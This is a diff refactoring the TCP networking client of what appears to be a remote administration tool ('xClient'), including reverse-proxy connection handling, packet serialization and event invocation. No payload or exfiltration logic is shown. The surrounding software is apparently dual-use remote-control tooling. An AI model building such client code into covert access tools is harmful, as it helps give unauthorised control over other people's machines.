@@ -34,9 +34,10 @@ namespace xClient.Core.Networking
         /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
         private void OnClientFail(Exception ex)
         {
-            if (ClientFail != null)
+            var handler = ClientFail;
+            if (handler != null)
             {
-                ClientFail(this, ex);
+                handler(this, ex);
             }
         }
 
@@ -62,9 +63,10 @@ namespace xClient.Core.Networking
 
             Connected = connected;
 
-            if (ClientState != null)
+            var handler = ClientState;
+            if (handler != null)
             {
-                ClientState(this, connected);
+                handler(this, connected);
             }
         }
 
@@ -86,9 +88,10 @@ namespace xClient.Core.Networking
         /// <param name="packet">The packet that has been received by the server.</param>
         private void OnClientRead(IPacket packet)
         {
-            if (ClientRead != null)
+            var handler = ClientRead;
+            if (handler != null)
             {
-                ClientRead(this, packet);
+                handler(this, packet);
             }
         }
 
@@ -114,9 +117,10 @@ namespace xClient.Core.Networking
         /// <param name="rawData">The packet in raw bytes.</param>
         private void OnClientWrite(IPacket packet, long length, byte[] rawData)
         {
-            if (ClientWrite != null)
+            var handler = ClientWrite;
+            if (handler != null)
             {
-                ClientWrite(this, packet, length, rawData);
+                handler(this, packet, length, rawData);
             }
         }
 
@@ -254,13 +258,16 @@ namespace xClient.Core.Networking
         /// <summary>
         /// The packet serializer.
         /// </summary>
-        private Serializer _serializer;
+        protected Serializer Serializer { get; set; }
 
         private const bool encryptionEnabled = true;
         private const bool compressionEnabled = true;
 
-        public Client()
+        protected Client()
         {
+            _proxyClients = new List<ReverseProxyClient>();
+            _readBuffer = new byte[BUFFER_SIZE];
+            _tempHeader = new byte[HEADER_SIZE];
         }
 
         /// <summary>
@@ -268,21 +275,14 @@ namespace xClient.Core.Networking
         /// </summary>
         /// <param name="host">The host (or server) to connect to.</param>
         /// <param name="port">The port of the host.</param>
-        public void Connect(string host, ushort port)
+        protected void Connect(string host, ushort port)
         {
-            if (_serializer == null) throw new Exception("Serializer not initialized");
-
             try
             {
                 Disconnect();
-                Initialize();
 
                 _handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 _handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
-
-                _readBuffer = new byte[BUFFER_SIZE];
-                _tempHeader = new byte[HEADER_SIZE];
-
                 _handle.Connect(host, port);
 
                 if (_handle.Connected)
@@ -297,62 +297,55 @@ namespace xClient.Core.Networking
             }
         }
 
-        private void Initialize()
-        {
-            lock (_proxyClientsLock)
-            {
-                _proxyClients = new List<ReverseProxyClient>();
-            }
-        }
-
         private void AsyncReceive(IAsyncResult result)
         {
+            int bytesTransferred;
+
             try
             {
-                int bytesTransferred;
+                bytesTransferred = _handle.EndReceive(result);
 
-                try
-                {
-                    bytesTransferred = _handle.EndReceive(result);
-
-                    if (bytesTransferred <= 0)
-                    {
-                        Disconnect();
-                        return;
-                    }
-                }
-                catch (NullReferenceException)
-                {
-                    return;
-                }
-                catch (ObjectDisposedException)
-                {
-                    return;
-                }
-                catch (Exception)
-                {
-                    Disconnect();
-                    return;
-                }
-
-                byte[] received = new byte[bytesTransferred];
-                Array.Copy(_readBuffer, received, received.Length);
-                lock (_readBuffers)
-                {
-                    _readBuffers.Enqueue(received);
-                }
-
-                lock (_readingPacketsLock)
-                {
-                    if (!_readingPackets)
-                    {
-                        _readingPackets = true;
-                        ThreadPool.QueueUserWorkItem(AsyncReceive);
-                    }
-                }
+                if (bytesTransferred <= 0)
+                    throw new Exception("no bytes transferred");
             }
-            catch
+            catch (NullReferenceException)
             {
+                return;
+            }
+            catch (ObjectDisposedException)
+            {
+                return;
+            }
+            catch (Exception)
+            {
+                Disconnect();
+                return;
+            }
+
+            byte[] received = new byte[bytesTransferred];
+
+            try
+            {
+                Array.Copy(_readBuffer, received, received.Length);
+            }
+            catch (Exception ex)
+            {
+                OnClientFail(ex);
+                return;
+            }
+
+            lock (_readBuffers)
+            {
+                _readBuffers.Enqueue(received);
+            }
+
+            lock (_readingPacketsLock)
+            {
+                if (!_readingPackets)
+                {
+                    _readingPackets = true;
+                    ThreadPool.QueueUserWorkItem(AsyncReceive);
+                }
             }
 
             try
@@ -523,7 +516,7 @@ namespace xClient.Core.Networking
                                     {
                                         try
                                         {
-                                            IPacket packet = (IPacket)_serializer.Deserialize(deserialized);
+                                            IPacket packet = (IPacket)Serializer.Deserialize(deserialized);
 
                                             OnClientRead(packet);
                                         }
@@ -565,33 +558,35 @@ namespace xClient.Core.Networking
         /// <param name="packet">The packet to be send.</param>
         public void Send<T>(T packet) where T : IPacket
         {
-            if (!Connected) return;
+            if (!Connected || packet == null) return;
 
             lock (_sendBuffers)
             {
-                try
+                using (MemoryStream ms = new MemoryStream())
                 {
-                    using (MemoryStream ms = new MemoryStream())
+                    try
                     {
-                        _serializer.Serialize(ms, packet);
-
-                        byte[] payload = ms.ToArray();
-
-                        _sendBuffers.Enqueue(payload);
-
-                        OnClientWrite(packet, payload.LongLength, payload);
-
-                        lock (_sendingPacketsLock)
-                        {
-                            if (_sendingPackets) return;
-
-                            _sendingPackets = true;
-                        }
-                        ThreadPool.QueueUserWorkItem(Send);
+                        Serializer.Serialize(ms, packet);
                     }
-                }
-                catch
-                {
+                    catch (Exception ex)
+                    {
+                        OnClientFail(ex);
+                        return;
+                    }
+
+                    byte[] payload = ms.ToArray();
+
+                    _sendBuffers.Enqueue(payload);
+
+                    OnClientWrite(packet, payload.LongLength, payload);
+
+                    lock (_sendingPacketsLock)
+                    {
+                        if (_sendingPackets) return;
+
+                        _sendingPackets = true;
+                    }
+                    ThreadPool.QueueUserWorkItem(Send);
                 }
             }
         }
@@ -637,6 +632,7 @@ namespace xClient.Core.Networking
                 {
                     _handle.Send(BuildPacket(payload));
                 }
+                
                 catch (Exception ex)
                 {
                     OnClientFail(ex);
@@ -703,7 +699,7 @@ namespace xClient.Core.Networking
                             foreach (ReverseProxyClient proxy in _proxyClients)
                                 proxy.Disconnect();
                         }
-                        catch
+                        catch (Exception)
                         {
                         }
                     }
@@ -717,15 +713,6 @@ namespace xClient.Core.Networking
             }
 
             OnClientState(false);
-        }
-
-        /// <summary>
-        /// Adds Types to the serializer.
-        /// </summary>
-        /// <param name="types">Types to add.</param>
-        public void AddTypesToSerializer(Type[] types)
-        {
-            _serializer = new Serializer(types);
         }
 
         public void ConnectReverseProxy(ReverseProxyConnect command)
